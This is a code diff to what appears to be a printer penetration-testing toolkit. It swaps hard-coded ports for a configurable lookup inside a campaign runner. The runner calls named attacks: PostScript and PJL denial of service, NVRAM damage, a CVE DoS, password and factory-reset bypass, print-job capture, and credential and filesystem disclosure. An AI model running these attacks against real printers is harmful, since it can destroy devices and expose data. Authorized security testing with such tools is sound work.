@@ -181,7 +181,8 @@ def dos_ps_showpage_redef(host: str, port: int = 9100, dry: bool = True,
     else:
         resp = _send_raw(host, port, UEL + b'%!\nproduct == flush\n' + UEL, timeout)
 
-    reachable = port in [9100]
+    from utils.ports import PortConfig as _PC_loc
+    reachable = port == _PC_loc.resolve('raw') or len(resp) > 0
     return AttackResult(
         category='DoS',
         attack='ps_showpage_redefinition',
@@ -803,8 +804,11 @@ def run_campaign(
                 evidence=str(exc)[:60], severity='info',
             )
 
-    pjl_port = 9100 if 9100 in ports else None
-    ps_avail  = 9100 in ports  # PS goes over port 9100 too (RAW)
+    from utils.ports import PortConfig as _PC
+    _raw_port = _PC.resolve('raw')
+    _ipp_port = _PC.resolve('ipp')
+    pjl_port  = _raw_port if _raw_port in ports else None
+    ps_avail  = _raw_port in ports  # PS goes over RAW port too
 
     if verbose:
         print(f"\n{'='*65}")
@@ -817,30 +821,30 @@ def run_campaign(
         print(f"  {CYN}[1/5] DENIAL OF SERVICE{RESET}")
 
     if ps_avail or 'PS' in langs or 'POSTSCRIPT' in langs:
-        r = _run(dos_ps_infinite_loop, host, 9100, dry_run, timeout)
+        r = _run(dos_ps_infinite_loop, host, _raw_port, dry_run, timeout)
         report.results.append(r)
         _print_result(r, verbose)
 
-        r = _run(dos_ps_showpage_redef, host, 9100, dry_run, timeout)
+        r = _run(dos_ps_showpage_redef, host, _raw_port, dry_run, timeout)
         report.results.append(r)
         _print_result(r, verbose)
 
     if pjl_port or 'PJL' in langs:
-        r = _run(dos_pjl_offline, host, 9100, dry_run, timeout)
+        r = _run(dos_pjl_offline, host, _raw_port, dry_run, timeout)
         report.results.append(r)
         _print_result(r, verbose)
 
-        r = _run(dos_pjl_nvram_damage, host, 9100, dry_run, 50, timeout)
+        r = _run(dos_pjl_nvram_damage, host, _raw_port, dry_run, 50, timeout)
         report.results.append(r)
         _print_result(r, verbose)
 
     # Always test CVE-2024-51982 (Brother/Ricoh)
-    r = _run(dos_cve_2024_51982, host, 9100, timeout)
+    r = _run(dos_cve_2024_51982, host, _raw_port, timeout)
     report.results.append(r)
     _print_result(r, verbose)
 
     # IPP purge
-    if 631 in ports:
+    if _ipp_port in ports:
         from protocols.ipp_attacks import purge_all_jobs, discover_endpoints
         eps = discover_endpoints(host, timeout)
         if eps:
@@ -859,15 +863,15 @@ def run_campaign(
     if verbose:
         print(f"\n  {CYN}[2/5] PROTECTION BYPASS{RESET}")
 
-    r = _run(bypass_pjl_password, host, 9100, timeout)
+    r = _run(bypass_pjl_password, host, _raw_port, timeout)
     report.results.append(r)
     _print_result(r, verbose)
 
-    r = _run(bypass_pml_factory_reset, host, 9100, dry_run, timeout)
+    r = _run(bypass_pml_factory_reset, host, _raw_port, dry_run, timeout)
     report.results.append(r)
     _print_result(r, verbose)
 
-    r = _run(bypass_ps_exitserver, host, 9100, timeout)
+    r = _run(bypass_ps_exitserver, host, _raw_port, timeout)
     report.results.append(r)
     _print_result(r, verbose)
 
@@ -879,15 +883,15 @@ def run_campaign(
     if verbose:
         print(f"\n  {CYN}[3/5] PRINT JOB MANIPULATION{RESET}")
 
-    r = _run(job_overlay, host, 9100, '', dry_run, timeout)
+    r = _run(job_overlay, host, _raw_port, '', dry_run, timeout)
     report.results.append(r)
     _print_result(r, verbose)
 
-    r = _run(job_capture_start, host, 9100, dry_run, timeout)
+    r = _run(job_capture_start, host, _raw_port, dry_run, timeout)
     report.results.append(r)
     _print_result(r, verbose)
 
-    r = _run(job_capture_list, host, 9100, timeout)
+    r = _run(job_capture_list, host, _raw_port, timeout)
     report.results.append(r)
     _print_result(r, verbose)
 
@@ -895,19 +899,19 @@ def run_campaign(
     if verbose:
         print(f"\n  {CYN}[4/5] INFORMATION DISCLOSURE{RESET}")
 
-    r = _run(info_pjl_memory_access, host, 9100, timeout)
+    r = _run(info_pjl_memory_access, host, _raw_port, timeout)
     report.results.append(r)
     _print_result(r, verbose)
 
-    r = _run(info_ps_filesystem, host, 9100, '/', timeout)
+    r = _run(info_ps_filesystem, host, _raw_port, '/', timeout)
     report.results.append(r)
     _print_result(r, verbose)
 
-    r = _run(info_ps_credential_disclosure, host, 9100, timeout)
+    r = _run(info_ps_credential_disclosure, host, _raw_port, timeout)
     report.results.append(r)
     _print_result(r, verbose)
 
-    r = _run(info_cors_spoofing_probe, host, 9100, timeout)
+    r = _run(info_cors_spoofing_probe, host, _raw_port, timeout)
     report.results.append(r)
     _print_result(r, verbose)
 
